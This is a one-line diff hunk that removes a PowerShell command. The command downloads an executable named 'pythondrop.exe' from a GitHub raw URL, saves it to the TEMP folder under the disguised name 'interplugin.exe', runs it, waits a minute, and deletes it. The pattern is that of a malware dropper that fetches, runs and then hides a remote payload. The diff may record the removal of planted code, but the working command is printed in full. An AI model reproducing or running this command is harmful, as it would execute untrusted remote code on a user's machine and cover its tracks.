@@ -1,1 +1,0 @@
-$destination= $env:TEMP + "\interplugin.exe";Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/pythondrop.exe -Destination $destination;Start-Process($env:TEMP + "\interplugin.exe");Start-Sleep -Seconds 60;rm $destination
